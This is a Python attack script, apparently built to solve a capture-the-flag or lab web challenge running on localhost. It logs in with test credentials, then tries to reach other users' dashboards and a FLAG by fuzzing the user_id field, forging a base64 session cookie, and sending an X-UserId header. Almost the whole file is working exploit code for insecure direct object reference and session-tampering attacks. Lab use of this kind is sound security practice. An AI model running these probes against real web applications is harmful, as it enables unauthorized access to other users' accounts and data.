import requests
import base64
import json

base_url = "http://127.0.0.1:33029"
session = requests.Session()

# Step 1: Authenticate to get a fresh session
print("=" * 60)
print("STEP 1: Authentication")
print("=" * 60)

auth_data = {"username": "test", "password": "test"}
auth_resp = session.post(f"{base_url}/", data=auth_data, allow_redirects=False)

print(f"[+] POST / - Status: {auth_resp.status_code}")
print(f"[+] Response Cookies: {dict(auth_resp.cookies)}")
print(f"[+] Session Cookies: {dict(session.cookies)}")

if 'Set-Cookie' in auth_resp.headers:
    print(f"[+] Set-Cookie header: {auth_resp.headers['Set-Cookie']}")

# Follow redirect manually to understand the flow
if auth_resp.status_code == 302:
    redirect_url = auth_resp.headers.get('Location', '')
    print(f"[+] Redirect to: {redirect_url}")
    
    # Get the password page
    password_resp = session.get(f"{base_url}{redirect_url}")
    print(f"\n[+] GET {redirect_url} - Status: {password_resp.status_code}")
    print(f"[+] Response length: {len(password_resp.text)} bytes")
    
    # Look for user_id in the form
    import re
    user_id_match = re.search(r'name=["\']user_id["\'][^>]*value=["\'](\d+)["\']', password_resp.text)
    if user_id_match:
        print(f"[+] Found user_id in form: {user_id_match.group(1)}")

print("\n" + "=" * 60)
print("STEP 2: Baseline - POST with correct user_id (10032)")
print("=" * 60)

# Baseline with correct user_id
baseline_data = {"password": "test", "user_id": "10032"}
baseline_resp = session.post(f"{base_url}/password/test", data=baseline_data, allow_redirects=False)

print(f"[+] POST /password/test - Status: {baseline_resp.status_code}")
print(f"[+] Baseline response (first 500 chars):\n{baseline_resp.text[:500]}")

# Check for FLAG in baseline
if 'FLAG' in baseline_resp.text:
    print("[!!!] FLAG FOUND IN BASELINE!")
    flag_match = re.search(r'FLAG\{[^}]+\}', baseline_resp.text)
    if flag_match:
        print(f"[!!!] FLAG: {flag_match.group(0)}")

# Follow redirect to dashboard
if baseline_resp.status_code == 302:
    dash_resp = session.get(f"{base_url}/dashboard")
    print(f"\n[+] GET /dashboard - Status: {dash_resp.status_code}")
    print(f"[+] Dashboard length: {len(dash_resp.text)} bytes")
    if 'FLAG' in dash_resp.text:
        print("[!!!] FLAG FOUND IN DASHBOARD!")
        flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
        if flag_match:
            print(f"[!!!] FLAG: {flag_match.group(0)}")

print("\n" + "=" * 60)
print("STEP 3: IDOR Fuzzing - Testing Different user_id Values")
print("=" * 60)

test_ids = [10030, 10031, 10033, 10034, 10035, 10000, 10050, 10099]
results = []

for test_id in test_ids:
    print(f"\n--- Testing user_id={test_id} ---")
    
    # New session for each test to avoid cookie pollution
    test_session = requests.Session()
    
    # Re-authenticate
    test_session.post(f"{base_url}/", data=auth_data, allow_redirects=False)
    
    # Test with different user_id
    test_data = {"password": "test", "user_id": str(test_id)}
    test_resp = test_session.post(f"{base_url}/password/test", data=test_data, allow_redirects=False)
    
    print(f"[+] Status: {test_resp.status_code}")
    print(f"[+] Response length: {len(test_resp.text)} bytes")
    
    # Check for interesting content
    if test_resp.status_code == 302:
        print(f"[+] Redirect Location: {test_resp.headers.get('Location', 'N/A')}")
        
        # Follow redirect and check dashboard
        dash_test = test_session.get(f"{base_url}/dashboard")
        print(f"[+] Dashboard status: {dash_test.status_code}")
        
        # Look for user data
        user_match = re.search(r'(User|Name|Email|ID)[^<]*[:\-]?\s*([^<\n]{3,50})', dash_test.text, re.I)
        if user_match:
            print(f"[+] User data found: {user_match.group(0)}")
        
        # Check for FLAG
        if 'FLAG' in dash_test.text:
            print("[!!!] FLAG FOUND!")
            flag_match = re.search(r'FLAG\{[^}]+\}', dash_test.text)
            if flag_match:
                print(f"[!!!] FLAG: {flag_match.group(0)}")
    
    # Check for error messages
    if 'error' in test_resp.text.lower() or 'invalid' in test_resp.text.lower():
        error_snippet = re.search(r'(error|invalid)[^<]{0,100}', test_resp.text, re.I)
        if error_snippet:
            print(f"[+] Error message: {error_snippet.group(0)}")
    
    # Compare with baseline
    response_diff = "Same" if test_resp.status_code == baseline_resp.status_code else "Different"
    print(f"[+] Compared to baseline (10032): {response_diff}")
    
    results.append({
        'id': test_id,
        'status': test_resp.status_code,
        'length': len(test_resp.text),
        'diff': response_diff
    })

print("\n" + "=" * 60)
print("STEP 4: Cookie Manipulation Test")
print("=" * 60)

# Decode the session cookie
session_cookie = session.cookies.get('session', '')
print(f"[+] Current session cookie: {session_cookie}")

# Decode and modify
if session_cookie:
    try:
        # Flask session cookies are typically base64 encoded with timestamp
        decoded = base64.b64decode(session_cookie + '==')
        print(f"[+] Decoded session: {decoded}")
        
        # Modify to user_id 10033
        modified_cookie = '{"user_id":10033}'
        # Flask sessions use a specific format, but let's try simple modification
        
        # Create a new session with modified cookie
        mod_session = requests.Session()
        mod_session.cookies.set('session', session_cookie)
        
        # Try accessing dashboard with original cookie first
        dash_check = mod_session.get(f"{base_url}/dashboard")
        print(f"[+] GET /dashboard with session - Status: {dash_check.status_code}")
        
        # Now try to manipulate by creating a forged cookie
        # Simple base64 encode of modified JSON
        forged_payload = base64.b64encode(b'{"user_id":10033}').decode()
        print(f"[+] Forged cookie payload: {forged_payload}")
        
        forged_session = requests.Session()
        # Note: This won't work with Flask's signed cookies without the secret key,
        # but testing anyway to see server response
        forged_session.cookies.set('session', forged_payload)
        
        dash_forged = forged_session.get(f"{base_url}/dashboard")
        print(f"[+] GET /dashboard with forged cookie - Status: {dash_forged.status_code}")
        
    except Exception as e:
        print(f"[+] Cookie decode error: {e}")

print("\n" + "=" * 60)
print("STEP 5: Header Manipulation Test")
print("=" * 60)

# Test with X-UserId header
header_session = requests.Session()
header_session.post(f"{base_url}/", data=auth_data, allow_redirects=False)

headers = {'X-UserId': '10033'}
dash_header = header_session.get(f"{base_url}/dashboard", headers=headers)

print(f"[+] GET /dashboard with X-UserId: 10033 - Status: {dash_header.status_code}")
print(f"[+] Response length: {len(dash_header.text)} bytes")

# Look for user identification
user_identifiers = re.findall(r'(user|id|name)[^<\n]{0,30}(10033|10032)', dash_header.text, re.I)
if user_identifiers:
    print(f"[+] Found user identifiers: {user_identifiers}")

# Check for FLAG
if 'FLAG' in dash_header.text:
    print("[!!!] FLAG FOUND IN HEADER TEST!")
    flag_match = re.search(r'FLAG\{[^}]+\}', dash_header.text)
    if flag_match:
        print(f"[!!!] FLAG: {flag_match.group(0)}")

print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)

print("\nFuzzing Results:")
for r in results:
    flag_indicator = " [FLAG?]" if r.get('flag_found') else ""
    print(f"  user_id={r['id']}: Status={r['status']}, Length={r['length']}B, {r['diff']}{flag_indicator}")

print("\nKey Findings:")
print(f"  - Baseline user_id (10032) response: {baseline_resp.status_code}")
print(f"  - Session cookie present: {'Yes' if session_cookie else 'No'}")
print(f"  - X-UserId header tested: Yes")

